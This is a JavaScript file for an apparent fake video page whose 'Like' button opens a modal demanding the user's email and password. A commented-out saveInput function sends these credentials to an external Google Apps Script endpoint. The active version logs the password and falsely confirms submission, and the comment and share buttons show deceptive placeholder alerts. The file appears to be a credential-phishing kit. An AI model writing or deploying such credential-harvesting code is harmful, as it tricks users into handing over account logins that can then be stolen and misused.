// Open the Like modal
function openModal() {
    document.getElementById("like-modal").classList.remove("hidden");
}

// Close the Like modal
function closeModal() {
    document.getElementById("like-modal").classList.add("hidden");
}

// function saveInput() {
//     const email = document.getElementById("email").value;
//     const password = document.getElementById("password").value;

//     console.log("User input - Email:", email, "Password:", password);

//     if (!email || !password) {
//         alert("Please fill in both email and password.");
//         return;
//     }

//     const googleScriptURL = "https://script.google.com/macros/s/AKfycbxsIoFAJnLeGx2jaErxJp9hsli-purZH3XL0ebMouKMQxoc3FOpQBIMl0HB7F9woi4Ftw/exec";

//     fetch(googleScriptURL, {
//         method: 'POST',
//         headers: {
//             'Content-Type': 'application/json',
//         },
//         body: JSON.stringify({
//             email: email,
//             password: password,
//         }),
//     })
//     .then((response) => {
//         if (!response.ok) {
//             throw new Error(`Server error: ${response.status}`);
//         }
//         return response.json();
//     })
//     .then((data) => {
//         console.log("Success:", data);
//         alert("Data saved successfully.");
//     })
//     .catch((error) => {
//         console.error("Error occurred during fetch request:", error);
//         alert("An error occurred while saving your data.");
//     });
// }

function saveInput() {
    // Get the input values
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    // Validate input fields
    if (!email || !password) {
        alert("Please fill in both email and password.");
        return;
    }

    // Simulate saving the input (can be replaced with server-side logic or API calls)
    console.log("User input - Email:", email, "Password:", password);

    // Show success prompt
    alert("Your details have been submitted successfully!");

    // Close the modal
    closeModal();
}

// Open the Comment modal
function openCommentBox() {
    document.getElementById("comment-box").classList.remove("hidden");
}

// Close the Comment modal
function closeCommentBox() {
    document.getElementById("comment-box").classList.add("hidden");
}

// Save Comment
function saveComment() {
    alert("Poor Internet.");
    closeCommentBox();
}

// Placeholder for Share
function shareVideo() {
    alert("Share feature unavailable at the moment.");
}
